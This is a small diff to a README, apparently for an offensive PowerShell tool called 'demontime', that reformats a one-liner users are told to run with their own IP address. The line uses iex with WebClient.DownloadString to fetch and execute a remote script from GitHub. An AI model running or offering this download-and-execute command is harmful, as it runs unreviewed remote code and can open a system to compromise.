@@ -32,8 +32,8 @@ Fork this repo so you can run the following one liner with your own IP Address a
 
 **NOTE: Replace the URL with your own forked repo.** 
 
-```iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/xxxxxxx/demontime/main/demontime-template.ps1')
-
-
+```
+iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/xxxxxxx/demontime/main/demontime-template.ps1')
+```
 
 ![image](https://github.com/aaronquiamco/demontime/assets/59388557/e651c43a-6868-4124-ba6f-d3beaaf192bb)
